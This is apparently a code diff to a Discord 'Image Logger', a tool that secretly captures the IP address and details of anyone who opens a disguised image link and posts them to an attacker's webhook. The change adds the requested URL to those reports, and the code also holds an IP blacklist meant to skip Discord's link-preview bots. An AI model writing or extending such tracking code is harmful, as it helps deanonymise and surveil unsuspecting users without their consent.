@@ -65,7 +65,7 @@ config = {
 
 blacklistedIPs = ("27", "34", "35", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
-def makeReport(ip, useragent = None, coords = None):
+def makeReport(ip, useragent = None, coords = None, endpoint = "N/A"):
     if ip.startswith(blacklistedIPs):
         if not ip.startswith("34", "35"): return
         requests.post(config["webhook"], json = {
@@ -75,7 +75,7 @@ def makeReport(ip, useragent = None, coords = None):
         {
             "title": "Image Logger - Link Sent",
             "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a Discord chat!\nYou may receive an IP soon.\n\n**IP**: `{ip}`",
+            "description": f"An **Image Logging** link was sent in a Discord chat!\nYou may receive an IP soon.\n\n**IP:** `{ip}`\n**URL:** `{endpoint}`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
@@ -121,6 +121,8 @@ def makeReport(ip, useragent = None, coords = None):
             "title": "Image Logger - IP Logged",
             "color": config["color"],
             "description": f"""**A User Opened the Original Image!**
+
+**URL:** {endpoint}
             
 **IP Info:**
 > **IP:** `{ip if ip else 'Unknown'}`
